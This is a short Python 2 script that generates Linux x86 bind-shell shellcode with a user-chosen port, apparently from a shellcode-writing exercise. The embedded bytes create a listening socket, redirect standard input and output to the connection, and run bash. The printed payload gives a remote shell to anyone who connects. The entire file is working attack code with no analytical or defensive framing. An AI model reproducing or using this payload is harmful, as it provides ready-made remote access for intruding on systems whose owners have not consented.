import socket, sys, struct

if len(sys.argv) != 2:

      print "[*] Example: /usr/bin/python wrapper.py <port>"
      sys.exit(1)

port = sys.argv[1]
port = int(port)
port = socket.htons(port)
hexport = hex(port)
hexport = struct.pack("<H", port).encode("hex")

final_port = "\\x"+"\\x".join(a+b for a,b in zip(hexport[::2],hexport[1::2]))

buf = ("\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2\\x31\\xf6\\x66\\x68\\x67\\x01\\x66\\x58\\xb3\\x02\\xb1\\x01\\x52\\xcd\\x80\\x89\\xc6\\x66\\x68\\x69\\x01\\x66"
"\\x58\\x89\\xf3\\x52\\x52\\x66\\x68"
+ final_port +
"\\x66\\x6a\\x02\\x89\\xe1\\xb2"
"\\x10\\xcd\\x80\\x66\\x68\\x6b\\x01\\x66\\x58\\x89\\xf3\\x31\\xc9\\x51\\xcd"
"\\x80\\x66\\x68\\x6c\\x01\\x66\\x58\\x89\\xf3\\x31\\xc9\\x31\\xd2\\x31\\xf6"
"\\xcd\\x80\\x89\\xc6\\xb1\\x03\\x66\\x6a\\x3f\\x66\\x58\\x89\\xf3\\xfe\\xc9"
"\\xcd\\x80\\x75\\xf3\\x31\\xc0\\x50\\x68\\x62\\x61\\x73\\x68\\x68\\x62\\x69"
"\\x6e\\x2f\\x68\\x2f\\x2f\\x2f\\x2f\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1"
"\\x66\\x6a\\x0b\\x66\\x58\\xcd\\x80")

print '"' + (buf) + '"'
